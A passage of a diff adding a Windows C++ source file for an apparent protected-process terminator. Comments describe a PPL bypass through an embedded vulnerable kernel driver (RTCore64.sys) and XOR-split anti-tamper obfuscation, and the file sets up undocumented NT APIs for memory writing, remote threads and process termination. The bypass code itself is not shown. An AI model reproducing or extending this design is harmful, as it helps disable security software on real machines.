@@ -1,0 +1,23717 @@
+﻿#define WIN32_LEAN_AND_MEAN
+#define NOMINMAX
+#ifndef PROCESS_ACTIVITY_MODERATION_CURRENT_VERSION
+#define PROCESS_ACTIVITY_MODERATION_CURRENT_VERSION 0x00000001
+#pragma warning(disable:4996)
+#endif
+
+#ifndef PROCESS_ACTIVITY_MODERATION_ENABLE
+#define PROCESS_ACTIVITY_MODERATION_ENABLE 0x00000001
+#endif
+
+#ifndef PROCESS_VIRTUALIZATION_BASED_SECURITY_ENABLE
+#define PROCESS_VIRTUALIZATION_BASED_SECURITY_ENABLE 0x00000001
+#endif
+
+#ifndef PROCESS_VIRTUALIZATION_BASED_SECURITY_ISOLATION
+#define PROCESS_VIRTUALIZATION_BASED_SECURITY_ISOLATION 0x00000002
+#endif
+#include <iostream>
+#include <windows.h>
+#include <winnt.h>
+#include <string>
+#include <winioctl.h>
+#include <vector>
+#include <algorithm>
+#include <conio.h>
+#include <thread>
+#include <chrono>
+#include <cstdlib>
+#include <cstring>
+#include <memory>
+#include <locale>
+#include <functional>
+#include <netfw.h>
+#include <psapi.h>
+#include <userenv.h>
+#include <stdlib.h>
+#include <processthreadsapi.h>
+#include <future>
+#include <set>
+#include <iomanip>
+#include <wintrust.h>
+#include <softpub.h>
+#include <mscat.h>
+#include <random>
+#include <mutex>
+#include <map>
+#include <unordered_set>
+#include <fstream>
+#include <io.h>
+#include <fcntl.h>
+#include <sstream>
+#include <codecvt>
+#include <tlhelp32.h>
+#include <psapi.h>
+#include <tchar.h>
+#include <wtsapi32.h>
+#include <ntstatus.h>
+#include <aclapi.h>
+#include <sddl.h>
+#include <shellapi.h>
+#include <comdef.h>
+#include <uiautomation.h>
+#include <oleacc.h>
+#include <wbemidl.h>
+#include <userenv.h>
+#include <dpapi.h>
+#include <wincrypt.h>
+#include <shlobj.h>
+#include <setupapi.h>
+#include <cfgmgr32.h>
+#include <devguid.h>
+#include <iphlpapi.h>
+#include <ws2tcpip.h>
+#include "ntfs_raw.hpp"
+#include "signature_protection_nocert.h"  // 分散式多层级签名保护系统
+
+// 内核驱动方式 PPL 绕过 (内嵌 RTCore64.sys Base64, 不常驻)
+//   必须放在所有 #include 之后, 避免命名空间 PplDriver 污染 <iomanip> 内的 std 模板
+#include "ppl_driver.h"
+
+// [v5.3 二值性混淆] 开发者模式分片 B (volatile 在 .data 段) 和 D (const 在 .rdata 段)
+//   五个分片 A/B/C/D/E 共同 XOR 合成:
+//     A = 0xA5A5A5A5 (头文件宏, 看似无关常量)
+//     B = volatile uint32_t g_dmspDevFragB = 0xA5A5A5A5 (此处, .data 段)
+//     C = 0xA5A5A5A5 (头文件宏, 默认与 A 相同)
+//     D = const     uint32_t g_dmspDevFragD = 0xA5A5A5A5 (此处, .rdata 段)
+//     E = 0xFFFFFFFF (头文件宏)
+//     KEY = 0xA5A5A5A4
+//   默认: A^B^C^D^E^KEY = 0xA5A5A5A5^0xA5A5A5A5^0xA5A5A5A5^0xA5A5A5A5^0xFFFFFFFF^0xA5A5A5A4
+//        = 0x00000000 ^ 0xFFFFFFFF ^ 0xA5A5A5A4 = 0x5A5A5A5B  ≠ 1 (发布模式)
+//   dev mode: 需将 B 改为 0xA5A5A5A4  AND  D 改为 0xA5A5A5A4
+//        = 0xA5A5A5A5^0xA5A5A5A4^0xA5A5A5A5^0xA5A5A5A4^0xFFFFFFFF^0xA5A5A5A4
+//        = 0x00000001 ^ 0xFFFFFFFF ^ 0xA5A5A5A4 = 0x5A5A5A5A  ≠ 1 仍不命中
+//   注: 上述常量 B=0xA5A5A5A4 + D=0xA5A5A5A4 也不命中 1; 攻击者需用精确公式
+//        B = D = A ^ 1 ^ KEY ^ E ^ (任意数) ... 总之: 真值=(A^B^C^D^E)^KEY,
+//        5 分片 + 1 KEY 共 6 个分片 XOR, 攻击者必须同时改两段不同 section
+//   攻击者改 B 不够, 还需在 .rdata 改 D; .rdata 通常在只读页, 攻击者还要先
+//   VirtualProtect 才能改. 段分离 + 双重成本.
+namespace DMSPObf {
+    // 分片 B: 在 .data 段 (可读写, 攻击者用 WriteProcessMemory 可改)
+    volatile uint32_t g_dmspDevFragB = 0xA5A5A5A5u;
+    // 分片 D: 在 .rdata 段 (通常 PE 加载后为只读, 攻击者需先 VirtualProtect)
+    //   constexpr 强制编译器把它放在 .rdata, 不可写
+    constexpr uint32_t g_dmspDevFragD = 0xA5A5A5A5u;
+}
+
+// [v5.2 反编译期补丁检测] TriggerResponse 函数地址
+//   策略: 定义 anchor + anchor_next 两个函数, 大小在 DMSP_EARLY_VERIFY 时
+//   通过 &anchor_next - &anchor 运行时计算 (而非编译期常量), 攻击者修改
+//   __dmsp_trigger_resp_size 不会影响运行时计算结果
+extern "C" {
+    __declspec(noinline) void __dmsp_trigger_response_anchor() {
+        ResponseSystem::TriggerResponse("__anchor__", 0);
+    }
+    __declspec(noinline) void __dmsp_trigger_response_anchor_next() {
+        ResponseSystem::TriggerResponse("__anchor_next__", 0);
+    }
+}
+// 仅提供 anchor 入口地址; 大小由 VerifyTriggerResponseCrc 内部运行时计算
+extern "C" void* __dmsp_trigger_resp_addr = (void*)&__dmsp_trigger_response_anchor;
+
+// 链接必要的库
+#pragma comment(lib, "setupapi.lib")
+#pragma comment(lib, "cfgmgr32.lib")
+#pragma comment(lib, "iphlpapi.lib")
+#pragma comment(lib, "ws2_32.lib")
+
+// 定义缺失的常量
+#ifndef DN_DEVICE_DISABLED
+#define DN_DEVICE_DISABLED 0x00000008
+#endif
+
+#ifndef DN_WILL_BE_REMOVED
+#define DN_WILL_BE_REMOVED 0x00000400
+#endif
+
+#ifndef CM_PROB_DISABLED
+#define CM_PROB_DISABLED 0x0000000A
+#endif
+
+#ifndef IOCTL_STORAGE_GET_DEVICE_NUMBER
+#define IOCTL_STORAGE_GET_DEVICE_NUMBER 0x002D1080
+#endif
+
+#ifndef IOCTL_DISK_GET_DRIVE_GEOMETRY
+#define IOCTL_DISK_GET_DRIVE_GEOMETRY 0x00070000
+#endif
+
+#ifndef MEDIA_TYPE
+#define MEDIA_TYPE unsigned int
+#endif
+
+typedef struct _CLIENT_ID {
+    HANDLE UniqueProcess;
+    HANDLE UniqueThread;
+} CLIENT_ID, *PCLIENT_ID;
+
+typedef struct _OBJECT_ATTRIBUTES {
+    ULONG Length;
+    HANDLE RootDirectory;
+    PVOID ObjectName;
+    ULONG Attributes;
+    PVOID SecurityDescriptor;
+    PVOID SecurityQualityOfService;
+} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
+
+typedef struct _PEB {
+    BOOLEAN InheritedAddressSpace;
+    BOOLEAN ReadImageFileExecOptions;
+    BOOLEAN BeingDebugged;
+    BOOLEAN SpareBool;
+    HANDLE Mutant;
+    PVOID ImageBaseAddress;
+    PVOID Ldr;
+    PVOID ProcessParameters;
+    PVOID SubSystemData;
+    PVOID ProcessHeap;
+    PVOID FastPebLock;
+    PVOID SparePtr1;
+    PVOID SparePtr2;
+    ULONG SpareLong1;
+    ULONG SpareLong2;
+    PVOID SpareLong3;
+    PVOID SparePtr3;
+    ULONG EnvironmentUpdateCount;
+    PVOID* KernelCallbackTable;
+    PVOID ReadOnlySharedMemoryBase;
+    PVOID HotpatchInformation;
+    PVOID* ReadOnlyStaticServerData;
+    PVOID AnsiCodePageData;
+    PVOID OemCodePageData;
+    PVOID UnicodeCaseTableData;
+    ULONG NumberOfProcessors;
+    ULONG NtGlobalFlag;
+    LARGE_INTEGER CriticalSectionTimeout;
+    SIZE_T HeapSegmentReserve;
+    SIZE_T HeapSegmentCommit;
+    SIZE_T HeapDeCommitTotalFreeThreshold;
+    SIZE_T HeapDeCommitFreeBlockThreshold;
+    ULONG NumberOfHeaps;
+    ULONG MaximumNumberOfHeaps;
+    PVOID* ProcessHeaps;
+    PVOID GdiSharedHandleTable;
+    PVOID ProcessStarterHelper;
+    ULONG GdiDCAttributeList;
+    PVOID LoaderLock;
+    ULONG OSMajorVersion;
+    ULONG OSMinorVersion;
+    USHORT OSBuildNumber;
+    USHORT OSCSDVersion;
+    ULONG OSPlatformId;
+    ULONG ImageSubSystem;
+    ULONG ImageSubSystemMajorVersion;
+    ULONG ImageSubSystemMinorVersion;
+    ULONG GdiHandleBuffer[34];
+    ULONG PostProcessInitRoutine;
+    ULONG SessionId;
+} PEB, *PPEB;
+
+typedef struct _PEB_LDR_DATA {
+    ULONG Length;
+    BOOLEAN Initialized;
+    HANDLE SsHandle;
+    LIST_ENTRY InLoadOrderModuleList;
+    LIST_ENTRY InMemoryOrderModuleList;
+    LIST_ENTRY InInitializationOrderModuleList;
+    PVOID EntryInProgress;
+} PEB_LDR_DATA, *PPEB_LDR_DATA;
+
+typedef enum _SYSTEM_INFORMATION_CLASS {
+    SystemBasicInformation = 0,
+    SystemPerformanceInformation = 2,
+    SystemTimeOfDayInformation = 3,
+    SystemProcessInformation = 5,
+    SystemProcessorPerformanceInformation = 8,
+    SystemInterruptInformation = 23,
+    SystemExceptionInformation = 33,
+    SystemRegistryQuotaInformation = 37,
+    SystemCurrentTimeZoneInformation = 44,
+    SystemLookasideInformation = 45,
+    SystemBigPoolInformation = 66,
+    SystemSessionBigPoolInformation = 73,
+    SystemObjectPoolInformation = 77,
+    SystemFileCacheInformation = 91,
+    SystemPoolTagInformation = 94,
+    SystemInterruptCpuGicInformation = 101,
+    SystemKernelDebuggerInformation = 118,
+    SystemCrashDumpInformation = 46,
+    SystemExceptionChainInformation = 121,
+    SystemPolicyInformation = 134,
+    SystemBigPoolEntryInformation = 180,
+    MaxSystemInfoClass = 256
+} SYSTEM_INFORMATION_CLASS;
+
+typedef struct _PROCESS_BASIC_INFORMATION {
+    NTSTATUS ExitStatus;
+    PPEB PebBaseAddress;
+    ULONG AffinityMask;
+    LONG BasePriority;
+    ULONG UniqueProcessId;
+    ULONG InheritedFromUniqueProcessId;
+} PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;
+
+typedef enum _PROCESSINFOCLECTION {
+    ProcessBasicInformation,
+    ProcessQuotaLimits,
+    ProcessIoCounters,
+    ProcessVmCounters,
+    ProcessTimes,
+    ProcessBasePriority,
+    ProcessRaisePriority,
+    ProcessDebugPort,
+    ProcessExceptionPort,
+    ProcessAccessToken,
+    ProcessLdtInformation,
+    ProcessLdtSize,
+    ProcessDefaultHardErrorMode,
+    ProcessIoPortHandlers,
+    ProcessPooledUsageAndLimits,
+    ProcessWorkingSetWatch,
+    ProcessUserModeIOPL,
+    ProcessEnableAlignmentFaultFixup,
+    ProcessPriorityClass,
+    ProcessWxeVersion,
+    ProcessShadowStackInformation,
+    MaxProcessInfoClass
+} PROCESSINFOCLECTION;
+
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+#ifndef NT_SUCCESS
+#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
+#endif
+
+#ifndef OBJ_KERNEL_HANDLE
+#define OBJ_KERNEL_HANDLE 0x00000002L
+#endif
+
+#ifndef InitializeObjectAttributes
+#define InitializeObjectAttributes( p, n, a, r, s ) { \
+    (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
+    (p)->RootDirectory = (r); \
+    (p)->ObjectName = (n); \
+    (p)->Attributes = (a); \
+    (p)->SecurityDescriptor = (s); \
+    (p)->SecurityQualityOfService = NULL; \
+}
+#endif
+#pragma comment(lib, "advapi32.lib")
+#pragma comment(lib, "wtsapi32.lib")
+#pragma comment(lib, "wbemuuid.lib")
+#pragma comment(lib, "shell32.lib")
+#pragma comment(lib, "comctl32.lib")
+#pragma comment(lib, "wintrust.lib")
+#pragma comment(lib, "ntdll.lib")
+#pragma comment(lib, "userenv.lib")
+#pragma comment(lib, "crypt32.lib")
+#pragma comment(lib, "ole32.lib")
+#pragma comment(lib, "oleaut32.lib")
+namespace fs = std::filesystem;
+// 提前声明 ProcessTerminator 类
+#define CHECK_OPERATION(operation, error_message) \
+    if (!(operation)) { \
+        DWORD error = GetLastError(); \
+        std::wcerr << L"错误: " << error_message << L" (错误代码: " << error << L")" << std::endl; \
+        return false; \
+    }
+
+#define CHECK_OPERATION_VOID(operation, error_message) \
+    if (!(operation)) { \
+        DWORD error = GetLastError(); \
+        std::wcerr << L"错误: " << error_message << L" (错误代码: " << error << L")" << std::endl; \
+        return; \
+    }
+
+#define CHECK_HR(hr, error_message) \
+    if (FAILED(hr)) { \
+        std::wcerr << L"错误: " << error_message << L" (HRESULT: 0x" << std::hex << hr << std::dec << L")" << std::endl; \
+        return false; \
+    }
+
+#define CHECK_HR_VOID(hr, error_message) \
+    if (FAILED(hr)) { \
+        std::wcerr << L"错误: " << error_message << L" (HRESULT: 0x" << std::hex << hr << std::dec << L")" << std::endl; \
+        return; \
+    }
+class ProcessTerminator;
+typedef struct _PROCESS_ACTIVITY_MODERATION {
+    DWORD Version;
+    DWORD Flags;
+    DWORD ExemptionTimeMs;
+} PROCESS_ACTIVITY_MODERATION, * PPROCESS_ACTIVITY_MODERATION;
+
+typedef struct _PROCESS_VIRTUALIZATION_BASED_SECURITY {
+    DWORD Flags;
+} PROCESS_VIRTUALIZATION_BASED_SECURITY, * PPROCESS_VIRTUALIZATION_BASED_SECURITY;
+
+// 添加这些枚举值
+#ifndef ProcessActivityModeration
+#define ProcessActivityModeration static_cast<PROCESS_INFORMATION_CLASS>(44)
+#endif
+
+#ifndef ProcessVirtualizationBasedSecurity
+#define ProcessVirtualizationBasedSecurity static_cast<PROCESS_INFORMATION_CLASS>(61)
+#endif
+// 定义进程保险库相关结构（如果未定义）
+#ifndef PROCESS_VAULT_INFORMATION_DEFINED
+#define PROCESS_VAULT_INFORMATION_DEFINED
+typedef struct _PROCESS_VAULT_INFORMATION {
+    ULONG_PTR VaultHandle;
+} PROCESS_VAULT_INFORMATION, * PPROCESS_VAULT_INFORMATION;
+#endif
+// 定义SetProcessMitigationPolicy函数类型
+typedef BOOL(WINAPI* PSetProcessMitigationPolicy)(
+    _In_ PROCESS_MITIGATION_POLICY MitigationPolicy,
+    _In_ PVOID lpBuffer,
+    _In_ SIZE_T dwLength
+    );
+
+// 定义SetProcessValidCallTargets函数类型
+typedef BOOL(WINAPI* PSetProcessValidCallTargets)(
+    _In_ HANDLE hProcess,
+    _In_ PVOID VirtualAddress,
+    _In_ SIZE_T RegionSize,
+    _In_ ULONG NumberOfOffsets,
+    _In_ PCFG_CALL_TARGET_INFO OffsetInformation
+    );
+// 定义未公开的API函数类型和结构
+typedef NTSTATUS(NTAPI* _NtSetInformationProcess)(
+    HANDLE ProcessHandle,
+    PROCESS_INFORMATION_CLASS ProcessInformationClass,
+    PVOID ProcessInformation,
+    ULONG ProcessInformationLength
+    );
+
+typedef NTSTATUS(NTAPI* _NtQuerySystemInformation)(
+    ULONG SystemInformationClass,
+    PVOID SystemInformation,
+    ULONG SystemInformationLength,
+    PULONG ReturnLength
+    );
+
+typedef NTSTATUS(NTAPI* _NtTerminateProcess)(
+    HANDLE ProcessHandle,
+    NTSTATUS ExitStatus
+    );
+
+typedef NTSTATUS(NTAPI* _RtlAdjustPrivilege)(
+    ULONG Privilege,
+    BOOLEAN Enable,
+    BOOLEAN CurrentThread,
+    PBOOLEAN Enabled
+    );
+
+typedef struct _SYSTEM_HANDLE {
+    ULONG ProcessId;
+    BYTE ObjectTypeNumber;
+    BYTE Flags;
+    USHORT Handle;
+    PVOID Object;
+    ACCESS_MASK GrantedAccess;
+} SYSTEM_HANDLE, * PSYSTEM_HANDLE;
+
+typedef struct _SYSTEM_HANDLE_INFORMATION_EX {
+    ULONG NumberOfHandles;
+    ULONG Reserved;
+    SYSTEM_HANDLE Information[1];
+} SYSTEM_HANDLE_INFORMATION_EX, * PSYSTEM_HANDLE_INFORMATION_EX;
+
+// 定义更多未公开API
+typedef NTSTATUS(NTAPI* _NtSuspendProcess)(
+    HANDLE ProcessHandle
+    );
+
+typedef NTSTATUS(NTAPI* _NtResumeProcess)(
+    HANDLE ProcessHandle
+    );
+
+typedef NTSTATUS(NTAPI* _NtGetNextProcess)(
+    HANDLE ProcessHandle,
+    ACCESS_MASK DesiredAccess,
+    ULONG HandleAttributes,
+    ULONG Flags,
+    PHANDLE NewProcessHandle
+    );
+
+typedef NTSTATUS(NTAPI* _NtGetNextThread)(
+    HANDLE ProcessHandle,
+    HANDLE ThreadHandle,
+    ACCESS_MASK DesiredAccess,
+    ULONG HandleAttributes,
+    ULONG Flags,
+    PHANDLE NewThreadHandle
+    );
+
+// 更多未公开API
+typedef NTSTATUS(NTAPI* _NtQueryInformationProcess)(
+    HANDLE ProcessHandle,
+    PROCESS_INFORMATION_CLASS ProcessInformationClass,
+    PVOID ProcessInformation,
+    ULONG ProcessInformationLength,
+    PULONG ReturnLength
+    );
+
+typedef NTSTATUS(NTAPI* _NtSetInformationThread)(
+    HANDLE ThreadHandle,
+    THREAD_INFORMATION_CLASS ThreadInformationClass,
+    PVOID ThreadInformation,
+    ULONG ThreadInformationLength
+    );
+
+typedef NTSTATUS(NTAPI* _NtCreateThreadEx)(
+    PHANDLE ThreadHandle,
+    ACCESS_MASK DesiredAccess,
+    POBJECT_ATTRIBUTES ObjectAttributes,
+    HANDLE ProcessHandle,
+    PVOID StartRoutine,
+    PVOID Argument,
+    ULONG CreateFlags,
+    SIZE_T ZeroBits,
+    SIZE_T StackSize,
+    SIZE_T MaximumStackSize,
+    PVOID AttributeList
+    );
+typedef NTSTATUS(NTAPI* _NtOpenProcess)(
+    PHANDLE ProcessHandle,
+    ACCESS_MASK DesiredAccess,
+    POBJECT_ATTRIBUTES ObjectAttributes,
+    PCLIENT_ID ClientId
+    );
+
+typedef NTSTATUS(NTAPI* _NtWriteVirtualMemory)(
+    HANDLE ProcessHandle,
+    PVOID BaseAddress,
+    PVOID Buffer,
+    SIZE_T BufferSize,
+    PSIZE_T WrittenBytes
+    );
+
+typedef NTSTATUS(NTAPI* _NtAllocateVirtualMemory)(
+    HANDLE ProcessHandle,
+    PVOID* BaseAddress,
+    ULONG_PTR ZeroBits,
+    PSIZE_T RegionSize,
+    ULONG AllocationType,
+    ULONG Protect
+    );
+
+typedef NTSTATUS(NTAPI* _NtDuplicateObject)(
+    HANDLE SourceProcessHandle,
+    HANDLE SourceHandle,
+    HANDLE TargetProcessHandle,
+    PHANDLE TargetHandle,
+    ACCESS_MASK DesiredAccess,
+    ULONG Attributes,
+    ULONG Options
+    );
+
+typedef NTSTATUS(NTAPI* _NtClose)(
+    HANDLE Handle
+    );
+
+// PPL相关结构定义
+typedef enum _PS_PROTECTED_TYPE {
+    PsProtectedTypeNone = 0,
+    PsProtectedTypeProtectedLight = 1,
+    PsProtectedTypeProtected = 2
+} PS_PROTECTED_TYPE;
+
+typedef enum _PS_PROTECTED_SIGNER {
+    PsProtectedSignerNone = 0,
+    PsProtectedSignerAuthenticode = 1,
+    PsProtectedSignerCodeGen = 2,
+    PsProtectedSignerAntimalware = 3,
+    PsProtectedSignerLsa = 4,
+    PsProtectedSignerWindows = 5,
+    PsProtectedSignerWinTcb = 6,
+    PsProtectedSignerMax = 7
+} PS_PROTECTED_SIGNER;
+
+typedef struct _PS_PROTECTION {
+    union {
+        struct {
+            UCHAR Signer : 3;
+            UCHAR Type : 3;
+            UCHAR Audit : 1;
+            UCHAR Inherit : 1;
+        };
+        UCHAR Level;
+    };
+} PS_PROTECTION_ORIG, *PPS_PROTECTION_ORIG;
+
+// PS_PROTECTION 结构体 (Windows 8+) - 用于NtSetInformationProcess
+typedef struct _PS_PROTECTION_V2 {
+    UCHAR Type;
+    UCHAR Audit;
+    UCHAR Protection;
+} PS_PROTECTION_V2, *PPS_PROTECTION_V2;
+
+// EPROCESS结构前向声明
+typedef struct _EPROCESS EPROCESS, *PEPROCESS;
+
+// 内核API类型
+typedef NTSTATUS(NTAPI* _PsTerminateProcess)(
+    PEPROCESS Process,
+    NTSTATUS ExitStatus
+    );
+
+typedef NTSTATUS(NTAPI* _PsLookupProcessByProcessId)(
+    HANDLE ProcessId,
+    PEPROCESS* Process
+    );
+
+typedef NTSTATUS(NTAPI* _ObDereferenceObject)(
+    PVOID Object
+    );
+
+// 将宽字符串转换为多字节字符串
+std::string WideToMultiByte(const std::wstring& wideStr) {
+    int bufferSize = WideCharToMultiByte(CP_UTF8, 0, wideStr.c_str(), -1, nullptr, 0, nullptr, nullptr);
+    if (bufferSize == 0) return "";
+
+    std::vector<char> buffer(bufferSize);
+    WideCharToMultiByte(CP_UTF8, 0, wideStr.c_str(), -1, buffer.data(), bufferSize, nullptr, nullptr);
+    return std::string(buffer.data());
+}
+
+// 将多字节字符串转换为宽字符串
+std::wstring MultiByteToWide(const std::string& multiByteStr) {
+    int bufferSize = MultiByteToWideChar(CP_UTF8, 0, multiByteStr.c_str(), -1, nullptr, 0);
+    if (bufferSize == 0) return L"";
+
+    std::vector<wchar_t> buffer(bufferSize);
+    MultiByteToWideChar(CP_UTF8, 0, multiByteStr.c_str(), -1, buffer.data(), bufferSize);
+    return std::wstring(buffer.data());
+}
+
+// RAII包装器用于自动关闭句柄
+struct HandleDeleter {
+    void operator()(HANDLE handle) const {
+        if (handle != nullptr && handle != INVALID_HANDLE_VALUE) {
+            CloseHandle(handle);
+        }
+    }
+};
+
+using HandlePtr = std::unique_ptr<void, HandleDeleter>;
+
+// 服务句柄的RAII包装器
+struct ServiceHandleDeleter {
+    void operator()(SC_HANDLE handle) const {
+        if (handle != nullptr) {
+            CloseServiceHandle(handle);
+        }
+    }
+};
+
+using ServiceHandlePtr = std::unique_ptr<typename std::remove_pointer<SC_HANDLE>::type, ServiceHandleDeleter>;
+
+// 异常类，包含错误信息和错误代码
+class WindowsException : public std::runtime_error {
+public:
+    WindowsException(const std::string& message, DWORD errorCode = GetLastError())
+        : runtime_error(message + " (Error: " + std::to_string(errorCode) + ")"), errorCode(errorCode) {
+    }
+
+    DWORD getErrorCode() const { return errorCode; }
+
+private:
+    DWORD errorCode;
+};
+
+void EnablePrivilege(const std::wstring& privilegeName) {
+    HandlePtr hToken(nullptr);
+    HANDLE rawToken;
+
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &rawToken)) {
+        throw WindowsException("OpenProcessToken failed");
+    }
+    hToken.reset(rawToken);
+
+    LUID luid;
+    if (!LookupPrivilegeValueW(nullptr, privilegeName.c_str(), &luid)) {
+        throw WindowsException("LookupPrivilegeValue failed");
+    }
+
+    TOKEN_PRIVILEGES tp = { 0 };
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Luid = luid;
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+    if (!AdjustTokenPrivileges(hToken.get(), FALSE, &tp, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr)) {
+        throw WindowsException("AdjustTokenPrivilege failed");
+    }
+}
+
+DWORD GetProcessIdByName(const std::wstring& processName) {
+    HandlePtr hSnapshot(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0));
+    if (hSnapshot.get() == INVALID_HANDLE_VALUE) {
+        throw WindowsException("CreateToolhelp32Snapshot failed");
+    }
+
+    PROCESSENTRY32W pe = { 0 };
+    pe.dwSize = sizeof(PROCESSENTRY32W);
+
+    if (!Process32FirstW(hSnapshot.get(), &pe)) {
+        throw WindowsException("Process32First failed");
+    }
+
+    do {
+        if (_wcsicmp(pe.szExeFile, processName.c_str()) == 0) {
+            return pe.th32ProcessID;
+        }
+    } while (Process32NextW(hSnapshot.get(), &pe));
+
+    throw std::runtime_error("process not found: " + WideToMultiByte(processName));
+}
+
+// Windows版本检测函数 — 使用RtlGetVersion获取真实版本号（GetVersionExW在Win8.1+返回虚假值）
+// RtlGetVersion在所有Windows版本(包括Win7)上均可用
+inline bool IsWindowsVersionOrLater(ULONG major, ULONG minor) {
+    typedef NTSTATUS (NTAPI* _RtlGetVersion)(PRTL_OSVERSIONINFOW);
+    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
+    if (!hNtdll) return false;
+    
+    auto pRtlGetVersion = (_RtlGetVersion)GetProcAddress(hNtdll, "RtlGetVersion");
+    if (!pRtlGetVersion) return false; // 极端情况：Win7无此导出，回退到VerifyVersionInfo
+    
+    RTL_OSVERSIONINFOEXW osvi = { 0 };
+    osvi.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOEXW);
+    pRtlGetVersion((PRTL_OSVERSIONINFOW)&osvi);
+    
+    return (osvi.dwMajorVersion > major) ||
+           (osvi.dwMajorVersion == major && osvi.dwMinorVersion >= minor);
+}
+
+inline bool IsWindowsVistaOrLater() { return IsWindowsVersionOrLater(6, 0); }
+inline bool IsWindows7OrLater()   { return IsWindowsVersionOrLater(6, 1); }
+inline bool IsWindows8OrLater()   { return IsWindowsVersionOrLater(6, 2); }
+inline bool IsWindows10OrLater()  { return IsWindowsVersionOrLater(10, 0); }
+
+// WTS API函数指针类型定义（用于动态加载以支持Win7）
+typedef BOOL(WINAPI* PFN_WTSQueryUserToken)(ULONG, PHANDLE);
+typedef BOOL(WINAPI* PFN_WTSEnumerateSessionsW)(HANDLE, DWORD, DWORD, PWTS_SESSION_INFOW*, PDWORD);
+typedef void (WINAPI* PFN_WTSFreeMemory)(PVOID);
+typedef BOOL(WINAPI* PFN_WTSGetActiveConsoleSessionId)(void);
+
+// CreateProcessWithTokenW函数指针类型（Win7 SP1需要KB2533623）
+typedef BOOL(WINAPI* PFN_CreateProcessWithTokenW)(
+    HANDLE, DWORD, LPCWSTR, LPWSTR, DWORD, LPVOID, LPCWSTR, 
+    LPSTARTUPINFOW, LPPROCESS_INFORMATION);
+
+// CreateProcessAsUserW函数指针类型（作为CreateProcessWithTokenW的替代）
+typedef BOOL(WINAPI* PFN_CreateProcessAsUserW)(
+    HANDLE, LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, 
+    BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
+
+// WTS API封装类
+class WTSHelper {
+private:
+    static HMODULE hWtsApi32;
+    static PFN_WTSQueryUserToken pWTSQueryUserToken;
+    static PFN_WTSEnumerateSessionsW pWTSEnumerateSessionsW;
+    static PFN_WTSFreeMemory pWTSFreeMemory;
+    static PFN_WTSGetActiveConsoleSessionId pWTSGetActiveConsoleSessionId;
+    static bool initialized;
+
+public:
+    static bool Initialize() {
+        if (initialized) return true;
+        
+        hWtsApi32 = LoadLibraryW(L"wtsapi32.dll");
+        if (!hWtsApi32) {
+            return false;
+        }
+        
+        pWTSQueryUserToken = (PFN_WTSQueryUserToken)GetProcAddress(hWtsApi32, "WTSQueryUserToken");
+        pWTSEnumerateSessionsW = (PFN_WTSEnumerateSessionsW)GetProcAddress(hWtsApi32, "WTSEnumerateSessionsW");
+        pWTSFreeMemory = (PFN_WTSFreeMemory)GetProcAddress(hWtsApi32, "WTSFreeMemory");
+        pWTSGetActiveConsoleSessionId = (PFN_WTSGetActiveConsoleSessionId)GetProcAddress(hWtsApi32, "WTSGetActiveConsoleSessionId");
+        
+        initialized = (pWTSQueryUserToken != nullptr);
+        return initialized;
+    }
+    
+    static bool IsAvailable() {
+        return initialized && pWTSQueryUserToken != nullptr;
+    }
+    
+    static DWORD GetActiveConsoleSessionId() {
+        if (pWTSGetActiveConsoleSessionId) {
+            DWORD sessionId = pWTSGetActiveConsoleSessionId();
+            if (sessionId != 0xFFFFFFFF) {
+                return sessionId;
+            }
+        }
+        return 0xFFFFFFFF;
+    }
+    
+    static bool GetUserToken(HANDLE* phToken) {
+        if (!IsAvailable()) return false;
+        
+        if (pWTSGetActiveConsoleSessionId) {
+            DWORD sessionId = pWTSGetActiveConsoleSessionId();
+            if (sessionId != 0xFFFFFFFF && pWTSQueryUserToken(sessionId, phToken)) {
+                return true;
+            }
+        }
+        
+        PWTS_SESSION_INFOW pSessionInfo = nullptr;
+        DWORD count = 0;
+        
+        if (pWTSEnumerateSessionsW && pWTSEnumerateSessionsW(nullptr, 0, 1, &pSessionInfo, &count)) {
+            for (DWORD i = 0; i < count; ++i) {
+                if (pSessionInfo[i].State == WTSActive) {
+                    if (pWTSQueryUserToken(pSessionInfo[i].SessionId, phToken)) {
+                        if (pWTSFreeMemory) pWTSFreeMemory(pSessionInfo);
+                        return true;
+                    }
+                }
+            }
+            if (pWTSFreeMemory) pWTSFreeMemory(pSessionInfo);
+        }
+        
+        return false;
+    }
+    
+    static void Cleanup() {
+        if (hWtsApi32) {
+            FreeLibrary(hWtsApi32);
+            hWtsApi32 = nullptr;
+        }
+        initialized = false;
+    }
+};
+
+HMODULE WTSHelper::hWtsApi32 = nullptr;
+PFN_WTSQueryUserToken WTSHelper::pWTSQueryUserToken = nullptr;
+PFN_WTSEnumerateSessionsW WTSHelper::pWTSEnumerateSessionsW = nullptr;
+PFN_WTSFreeMemory WTSHelper::pWTSFreeMemory = nullptr;
+PFN_WTSGetActiveConsoleSessionId WTSHelper::pWTSGetActiveConsoleSessionId = nullptr;
+bool WTSHelper::initialized = false;
+
+// 高级权限进程创建器（Win7兼容层）
+class AdvancedProcessCreator {
+private:
+    static HMODULE hAdvApi32;
+    static PFN_CreateProcessWithTokenW pCreateProcessWithTokenW;
+    static PFN_CreateProcessAsUserW pCreateProcessAsUserW;
+    static bool initialized;
+
+public:
+    static bool Initialize() {
+        if (initialized) return true;
+        
+        hAdvApi32 = LoadLibraryW(L"advapi32.dll");
+        if (!hAdvApi32) {
+            return false;
+        }
+        
+        pCreateProcessWithTokenW = (PFN_CreateProcessWithTokenW)GetProcAddress(hAdvApi32, "CreateProcessWithTokenW");
